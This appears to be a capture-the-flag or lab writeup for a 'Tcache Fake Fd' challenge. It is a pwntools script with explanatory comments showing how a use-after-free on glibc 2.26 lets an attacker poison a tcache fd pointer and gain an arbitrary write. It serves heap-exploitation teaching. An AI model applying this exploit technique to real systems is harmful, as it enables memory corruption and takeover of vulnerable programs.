'''
Tcache Fake Fd Challenge writeup:
- Run on GLibC version 2.26
'''

from pwn import * 

mode = 'DEBUG' # Turn on gdb
libc_name='../../../libc_versions/2.26/libc-2.26.so'
env = {}

# Binary setup
elf_name = '.fake_fd-2.26' 

elf = ELF(elf_name)
if libc_name != '': 
	libc = ELF(libc_name)
	env = {"LD_PRELOAD": libc.path}
	
# Process creation 
if mode == 'DEBUG': 
	p = process([elf.path],env=env)
	gdb.attach(p, gdbscript='''
dir ../../libc_versions/2.26/
''') 
else: 
	p = remote(domain, port) 

'''
We when write our data, there is already a use after free
without us doing anything! So, we have a 0x30 tcache chunk
that we can write the 'fd' pointer for. Prior to writing our
data, the tcache looks like the following: 
- 0x30: A

All we have to do is write to the location of the variable
'important_string' and our chunk will be in the tcache bin. 

Once we execute the write, the tcache looks like below: 
- 0x30: A -> 'important_string' (fake chunk) 

NOTE: Newer versions of the tcache have a 'count' check
on the amount of items in the bin. However, 2.26 has a bug
that does not validate the amount of elements in the tcache, 
resulting in us being able to append a value. 
'''

print("Overwriting fd pointer of tcache chunk")
fake_fd_location = 0xFFFFFFFFFFF # TODO/CHANGE ME: Set to the value of 'important_string' to perform attack
print("Fake fd location: {}".format(hex(fake_fd_location)))
p.sendlineafter("Data:", p64(fake_fd_location) )

'''
On the second call to malloc, the 0x30 tcache bin looks
like the following: 
- 0x30: A -> fake_chunk.

So, prior to getting our fake_chunk (at 'important_string') 
we need to allocate ONE chunk before this. Luckily, 
there is a malloc chunk that does exactly this. 
Remember that the tcache and fastbin are FIFO (first in first out). 

Preparing for our third call to malloc, the tcache bin 
looks like the following: 
- 0x30: fake_chunk

Now, we can write to this location with an arbitrary value!
'''

print("Sending data to overwrite our choosen address")
value = "DEADBEEF" # Change me to some other value, if you would like!
p.sendlineafter("victim:", value) 
p.interactive()

